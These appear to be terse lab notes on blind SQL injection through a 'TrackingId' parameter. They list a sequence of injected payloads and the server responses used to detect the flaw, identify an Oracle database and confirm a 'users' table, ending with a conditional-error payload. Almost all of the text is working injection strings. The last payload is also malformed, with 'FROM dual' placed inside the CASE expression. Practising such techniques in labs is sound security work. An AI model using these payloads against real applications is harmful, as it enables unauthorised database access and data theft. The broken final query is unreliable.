1. TrackingId=xyz' => Internal server error
2. TrackingId=xyz'' => No error => Syntax error has detectable effect on the response.
3. TrackingId=xyz'||(SELECT '')||' => Internal server error although valid query.
4. TrackingId=xyz'||(SELECT '' FROM dual)||' => No error => Oracle database.
5. TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' => No error => there is a table named users.
6. ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' FROM dual END)='a